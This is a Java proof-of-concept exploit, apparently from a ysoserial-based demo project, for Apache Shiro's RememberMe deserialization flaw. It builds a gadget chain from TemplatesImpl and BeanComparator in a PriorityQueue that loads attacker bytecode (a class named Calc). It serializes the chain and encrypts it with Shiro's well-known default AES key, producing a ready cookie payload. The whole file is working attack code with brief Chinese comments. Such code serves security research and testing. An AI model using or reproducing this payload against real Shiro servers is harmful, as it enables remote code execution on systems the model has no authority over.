package ysoserial.vulndemo;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.NotFoundException;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Collections;
import java.util.PriorityQueue;

public class shiro_POC_withoutCC {
    public static void setFieldValue(Object obj, String fieldname, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static byte[] getPayload() throws NoSuchFieldException, IllegalAccessException, IOException, NotFoundException, CannotCompileException {
        //动态创建字节码
        byte[] bytes = ClassPool.getDefault().get("ysoserial.vulndemo.Calc").toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "RoboTerh");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});

        //创建比较器
        BeanComparator beanComparator = new BeanComparator();
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add(1);
        queue.add(1);

        //反射赋值
        setFieldValue(beanComparator, "property", "outputProperties");
        //下面这两个二选一都可以
        //setFieldValue(beanComparator, "comparator", String.CASE_INSENSITIVE_ORDER);
        setFieldValue(beanComparator, "comparator", Collections.reverseOrder());
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        //序列化
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(queue);
        oos.close();
        return baor.toByteArray();
    }

    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, NotFoundException, CannotCompileException {
        byte[] payload = getPayload();
        AesCipherService aes = new AesCipherService();
        //key值得解码
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource encrypt = aes.encrypt(payload, key);
        System.out.println(encrypt.toString());
    }
}
